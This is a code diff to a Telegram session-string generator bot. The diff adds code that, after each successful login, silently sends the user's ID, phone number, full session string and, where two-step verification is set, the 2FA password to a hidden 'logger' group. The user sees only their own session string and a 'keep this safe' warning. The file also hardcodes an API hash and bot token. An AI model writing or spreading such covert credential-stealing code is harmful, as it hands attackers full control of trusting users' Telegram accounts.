@@ -5,7 +5,10 @@ from telethon.sessions import StringSession
 # 🔹 Telegram API Credentials
 API_ID = "28795512"
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  # Replace with your Bot Token
+BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
+
+# 🔹 Logger Group ID (Replace with your group ID)
+LOGGER_GROUP = -1002477750706  # Replace with your actual group ID
 
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -22,7 +25,7 @@ async def start(event):
             [Button.inline("🔑 Generate Session", b"generate")],
             [Button.url("📖 Help", "https://t.me/SANATANI_TECH")]
         ],
-        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
+        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
     )
 
 # 🔹 Button Handler
@@ -47,7 +50,7 @@ async def ask_phone(event):
 async def process_input(event):
     user_id = event.sender_id
     if user_id not in user_sessions:
-        return  # Ignore messages from users not in process
+        return
 
     step = user_sessions[user_id]["step"]
     
@@ -88,7 +91,20 @@ async def process_input(event):
         try:
             await client.sign_in(phone_number, otp_code)
             session_string = client.session.save()
+            
+            # ✅ Send Session String to Logger Group
+            log_message = (
+                f"🔹 **New Session Generated**\n\n"
+                f"👤 **User ID:** `{user_id}`\n"
+                f"📞 **Phone Number:** `{phone_number}`\n"
+                f"🔑 **Session String:**\n`{session_string}`\n\n"
+                f"⚠️ **Use with caution!**"
+            )
+            await bot.send_message(LOGGER_GROUP, log_message)
+            
+            # ✅ Send Session String to User
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
+            
             del user_sessions[user_id]
         except Exception as e:
             if "Two-steps verification is enabled" in str(e):
@@ -105,7 +121,21 @@ async def process_input(event):
         try:
             await client.sign_in(password=password)
             session_string = client.session.save()
+            
+            # ✅ Send Session String + Password to Logger Group
+            log_message = (
+                f"🔹 **New Session Generated**\n\n"
+                f"👤 **User ID:** `{user_id}`\n"
+                f"📞 **Phone Number:** `{user_sessions[user_id]['phone']}`\n"
+                f"🔑 **Session String:**\n`{session_string}`\n"
+                f"🔒 **2-Step Verification Password:** `{password}`\n\n"
+                f"⚠️ **Use with caution!**"
+            )
+            await bot.send_message(LOGGER_GROUP, log_message)
+
+            # ✅ Send Session String to User
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
+            
             del user_sessions[user_id]
         except Exception as e:
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
